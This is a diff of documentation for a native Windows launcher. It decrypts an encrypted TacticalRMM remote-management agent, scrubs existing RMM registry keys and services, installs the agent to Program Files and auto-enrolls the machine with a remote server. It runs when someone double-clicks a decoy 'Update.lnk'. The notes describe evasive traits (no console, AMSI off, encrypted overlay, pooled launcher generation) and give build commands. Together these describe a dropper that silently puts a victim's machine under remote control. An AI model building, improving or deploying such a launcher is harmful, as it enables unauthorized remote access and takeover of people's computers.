@@ -5,13 +5,14 @@ ZIP bundle actually enrolls a device end-to-end on a stock Windows host:
 
 - **runs on stock Windows** — no Mono/.NET runtime, no file-association hack
   (fixes the earlier "device not added" runtime gap).
-- **auto-enrolls** — the launcher does not stop at staging: it stages the
-  decrypted agent to `<outDir>\_stg_<TAG>.exe`, waits ~6s for it to settle, then
-  runs the **staged payload itself** with the full `enroll` argv
-  (`-m install --api … --client-id … --site-id … --agent-type … --auth …`)
-  via `CreateProcess` — zero manual steps. No `/VERYSILENT` run and no reliance
-  on a fixed `C:\Program Files\TacticalAgent\tacticalrmm.exe` path (the staged
-  payload is a raw agent transport binary, not an Inno installer).
+- **installs to Program Files, then auto-enrolls** — the launcher does not stop
+  at staging: it scrubs stale TacticalRMM/Mesh registry + service state, installs
+  the decrypted agent to `C:\Program Files\TacticalAgent\tacticalrmm.exe`, waits
+  ~6s for it to settle, then runs the **installed binary** with the full `enroll`
+  argv (`-m install --api … --client-id … --site-id … --agent-type … --auth …`)
+  via `CreateProcess` — zero manual steps. Installing to Program Files first is
+  what makes the `tacticalrmm -m svc` service start (its ImagePath points there;
+  running the transport from a Temp-staged `_stg_*.exe` left the service Stopped).
 - **no console, no PowerShell, no script host, no shell invocation** — compiled
   with `-mwindows` (PE Subsystem 2 / GUI); `enroll` is parsed (never run
   through a shell) and handed to `CreateProcess`. AMSI default stays `none`.
@@ -24,7 +25,7 @@ the decryption in C, so pooled server stamps keep working.
 
 | file | purpose |
 |---|---|
-| `launcher.c`   | entry point: self-locate → decrypt → stage → settle-wait → run staged payload with the `enroll` argv (or `SELFTEST`) |
+| `launcher.c`   | entry point: self-locate → decrypt → scrub stale TacticalRMM/Mesh registry + service state → install to `C:\Program Files\TacticalAgent\tacticalrmm.exe` → settle-wait → run the installed exe with the `enroll` argv (or `SELFTEST`). Windows-only helpers: recursive registry scrub, uninstall-key cleanup, service delete, recursive mkdir |
 | `overlay.c`    | LOCKED VNTR overlay reader + AES-256-CTR envelope/config/payload decrypt |
 | `aes256.c/.h`  | AES-256 (encrypt block) + CTR with big-endian 128-bit counter (byte-identical to template.cs/OpenSSL) |
 | `config.c`     | percent-decoded config parser; quote-aware tokenizer for the `enroll` line |
@@ -43,6 +44,7 @@ IV=$(od  -An -N16 -tx1 /dev/urandom | tr -d ' \n')
 TAG=$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')
 bash build-native.sh /tmp/Launcher.exe "$KEY" "$IV" "$TAG"
 # -> PE32+ (GUI) + sha256 (verify: file /tmp/Launcher.exe shows "GUI")
+# (links -ladvapi32 for the registry/service APIs the install cleanup needs)
 ```
 
 The generator's launcher pool does this automatically when
@@ -72,7 +74,23 @@ cmp <outPayload.bin> <sourcePayload.bin>       # -> byte-identical (crypto proof
   both PE32 and PE32+ (the old +72 for 0x20b read `DllCharacteristics` and would
   have discarded a 64-bit native launcher).
 
+## Verified 2026-09-14 (Program-Files install + relative .lnk + idempotent first install)
+
+- Native launcher now installs the decrypted agent to
+  `C:\Program Files\TacticalAgent\tacticalrmm.exe` and runs the `enroll` argv from
+  there, so the `tacticalrmm -m svc` service (ImagePath points to that file) starts.
+- Before installing it scrubs stale state (elevated): `HKLM\SOFTWARE\TacticalRMM`
+  (+ `WOW6432Node`), the TacticalAgent/"Mesh Agent" Uninstall keys, and best-effort
+  `tacticalrmm` / "Mesh Agent" services — so a re-deploy is a clean first install.
+- Native `.lnk` bytes: `Update.lnk` now carries a minimal relative LinkInfo block
+  + `HasLinkInfo` (flags `0xCE` = HasLinkInfo|HasName|HasRelativePath|HasIconLocation|
+  IsUnicode, 279 B) so Explorer resolves `Launcher.exe` on a plain double-click
+  (the old 250-B `0xCC` relative .lnk with no LinkInfo silently did nothing).
+- Cross-compile warning-clean with `-ladvapi32`; SELFTEST + POSIX production compile
+  clean on macOS (pre-existing `write_marker` unused warning in SELFTEST only).
+
 ## Known remaining step (unavoidable off this host)
 
-A Windows-VM / wine run to observe the live silent-install → enroll → device
-Online. No wine is present on the build VPS; the runbook step (3-E) covers it.
+A Windows-VM / wine run to observe the live double-click → UAC → install →
+`tacticalrmm` + `Mesh Agent` services **Running** → device Online. No wine is
+present on the build VPS; the runbook step (3-E) covers it.
